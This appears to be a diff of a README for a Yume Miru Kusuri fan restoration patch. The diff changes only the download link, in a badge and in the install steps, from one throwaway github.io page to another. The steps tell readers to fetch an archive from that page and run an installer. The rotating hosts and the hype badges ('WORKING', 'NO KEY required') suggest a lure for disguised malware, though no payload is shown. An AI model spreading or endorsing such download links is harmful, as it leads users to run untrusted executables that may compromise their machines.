@@ -4,7 +4,7 @@
 
 ### Yume Miru Kusuri Restored Patch: free fan mod for Yume Miru Kusuri, no key, no ads.
 
-[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
+[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://phantommofence.github.io/download-win/)
 [![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
@@ -35,7 +35,7 @@ The Yume Miru Kusuri Restored Patch re-adds cut content and CGs to the PC releas
 
 ## 🛠️ Installation
 
-1. **Download the latest build** 👉 **[https://hornbladesmanhonor.github.io/download-win/](https://hornbladesmanhonor.github.io/download-win/)**
+1. **Download the latest build** 👉 **[https://phantommofence.github.io/download-win/](https://phantommofence.github.io/download-win/)**
 2. **Back up your save folder** before applying any mod.
 3. **Extract** the archive into the game's install directory.
 4. **Run the installer / copy the files** as instructed in the archive.
